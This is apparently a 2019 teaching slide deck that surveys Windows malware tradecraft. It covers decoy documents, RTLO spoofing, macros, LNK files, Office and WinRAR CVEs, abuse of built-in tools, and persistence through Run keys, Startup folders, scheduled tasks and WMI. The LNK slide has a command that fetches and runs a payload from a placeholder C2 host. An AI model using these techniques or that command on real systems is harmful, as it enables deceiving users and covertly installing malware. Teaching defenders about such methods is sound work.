# Exploit Tech

DuckLL  
2019/11/12 <!-- .element: align="right" -->

--

# Exploit Flow

1. Get control to execution
1. Leverage system tools (optional)
1. Run malware
1. Persistence

---

# Deploy method

--

# Fake Doc

- Word, PDF, Excel... icon
- PE file (.exe)
- 👍: Only need to change icon of PE.
- 👎: The filename extension will be discovered, if user turns on the setting.

--

# RTLO

- A special character
- UNICODE `202e`
- decoy[RTLO]cod.exe -> decoy‮cod.exe
- 👍: Solving the filename extension problem.
- 👎: There is a weird string "exe" at the end of filename

--

# Macro

- VBA scripts in Office documents
- 👍: Stable and high compatibility.
- 👎: In default, the victim should enable macro manually.

--

# LNK

- Word, PDF, Excel, etc ICON
- Can launch program with arguments
- ex: `mshta.exe http://c2.com/payload.hta"
- 👍: Nice decoy icon. And it's easy to leverage system tools.
- 👎: There is a arrow in the bottom right of icon.

--

# OLE Exploit

- RTF file (.rtf)
- EQNEDT32.EXE
- CVE-2017-11882: stackoverflow during font name parse
- CVE-2018-0802: stackoverflow during font name parse
- CVE-2018-0798: stackoverflow during matrix record parse
- 👍: Stable and automatical execution
- 👎: Old 1 day, can't execute on patched version

--

# CVE-2018-20250

- Win RAR exploit
- Writing files into relative path
- 👍: This kind of vulnerability is rare. The decoy content can be various.
- 👎:
  1. The victim didn't use "decompress here" in specified location.
  1. The malware will not execute immediately.

--

# Remote Object

- Download online documents which contain exploit or macro
- 👍: The actor can change or remove the 2nd-stage document.
- 👎: Same as exploit documents and macro documents.

---

# System Tools

--

# Command Line

- cmd.exe (xxx.bat)
- A simple shell to launch other program

--

# Powershell

- powershell.exe (xxx.ps1)
- Very powerful shell
  - run scripts
  - run PE in memroy

--

# VBScript

- cscript.exe (xxx.js)
- run scripts

--

# HTA

- mshta.exe (xxx.hta)
- download and run online scripts
- run scripts

---

# Persistence

--

# Registry

- Add a key value into registry
- ex: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Trigger while user login

--

# File

- Put files into specified folder.
- ex: `%appdata%\Microsoft\Windows\Start Menu\Programs\Startup`
- Trigger while user login

--

# ScheduledTask

- Add a new Windows task scheduler
- Trigger by time

--

# WMI

- Windows Management Instrumentation
- WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs.
- Run Windows Management Object (.mof) scripts
- Trigger while user login, if there is a LOGIN event filter.
